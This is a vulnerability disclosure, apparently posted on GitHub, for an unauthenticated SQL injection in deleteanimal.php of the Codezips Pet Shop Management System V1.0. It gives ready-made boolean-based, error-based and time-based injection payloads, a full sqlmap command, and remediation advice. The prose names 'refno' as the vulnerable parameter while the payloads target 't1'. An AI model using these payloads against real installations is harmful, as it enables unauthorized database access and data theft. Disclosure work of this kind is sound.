| Codezips Pet Shop Management System In PHP With Source Code V1.0 deleteanimal.php SQL injectionNAME OF AFFECTED PRODUCT(S)  * Pet Shop Management System In PHP With Source Code  Vendor Homepage  * <https://codezips.com/php/pet-shop-management-system-in-php-with-source-code/>  AFFECTED AND/OR FIXED VERSION(S)submitter  * XU RONGDA  Vulnerable File  * deleteanimal.php  VERSION(S)  * V1.0  Software Link  * <https://codeload.github.com/codezips/pet-shopphp/zip/master>  PROBLEM TYPEVulnerability Type  * SQL injection  Root Cause  * A SQL injection vulnerability was found in the 'deleteanimal.php' file of the 'Pet Shop Management System In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter "refno" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.  Impact  * Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.  DESCRIPTION  * During the security review of "Pet Shop Management System In PHP With Source Code", XU RONGDA discovered a critical SQL injection vulnerability in the "deleteanimal.php" file. This vulnerability stems from insufficient user input validation of the 'refno' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.  No login or authorization is required to exploit this vulnerabilityVulnerability details and POCVulnerability type:  * boolean-based blind * error-based * time-based blind  Vulnerability location:  * 'refno' parameter  Payload: ```     Parameter: t1 (POST)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)     Payload: t1=123456' AND 1673=(SELECT (CASE WHEN (1673=1673) THEN 1673 ELSE (SELECT 5355 UNION SELECT 6753) END))-- -      Type: error-based     Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)     Payload: t1=123456' OR ROW(9447,3925)>(SELECT COUNT(*),CONCAT(0x7171717871,(SELECT (ELT(9447=9447,1))),0x7170626a71,FLOOR(RAND(0)*2))x FROM (SELECT 3970 UNION SELECT 1909 UNION SELECT 4414 UNION SELECT 8282)a GROUP BY x)-- PUID      Type: time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)     Payload: t1=123456' AND (SELECT 2685 FROM (SELECT(SLEEP(5)))gnzB)-- Vrmn ``` The following are screenshots of some specific information obtained from testing and running with the sqlmap tool: ```     python sqlmap.py -u "http://localhost:8126/deleteanimal.php" --data="t1=123456" --cookie="PHPSESSID=19nf0dgpr07c9f36lfo4u57ck3" --dbs --batch --risk=3 --level=5 --random-agent --threads=5 ```  [1](https://private-user-images.githubusercontent.com/167133866/380424371-0cfe1152-c6d8-42ee-a9d1-223fb6f7f9c2.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTgyMjIsIm5iZiI6MTczNjYxNzkyMiwicGF0aCI6Ii8xNjcxMzM4NjYvMzgwNDI0MzcxLTBjZmUxMTUyLWM2ZDgtNDJlZS1hOWQxLTIyM2ZiNmY3ZjljMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxNzUyMDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wYWFmMGU3NjRjMWZkOTJkMjU0ZDAyM2I2OWYxYWE1MmY0NjJkYTgxZGU3M2Y4ZDBlNGRmNmEzZjdiYzJjNzUzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.dUTYNEzyvyStUMULPFcT_i5en7t_Xwh7cZGjrqdv4Ew) [2](https://private-user-images.githubusercontent.com/167133866/380424381-43007e54-1e4b-4db4-96a9-c3b396128a0f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTgyMjIsIm5iZiI6MTczNjYxNzkyMiwicGF0aCI6Ii8xNjcxMzM4NjYvMzgwNDI0MzgxLTQzMDA3ZTU0LTFlNGItNGRiNC05NmE5LWMzYjM5NjEyOGEwZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxNzUyMDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hM2IwOGYxZTNlYmE2YTM1YTA5MzcyNTRjYTE5NjVmYzQ3M2JkMWY3N2U4NDcwODQ5MTAzM2I1MWY0YmM3MzM0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.4fIUvLsL52GIVhUuXBK-WOIjep1vrrYO3oDcthef9yY) Suggested repair  1. **Use prepared statements and parameter binding:**    Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code. 2. **Input validation and filtering:**    Strictly validate and filter user input data to ensure it conforms to the expected format. 3. **Minimize database user permissions:**    Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations. 4. **Regular security audits:**    Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities. |
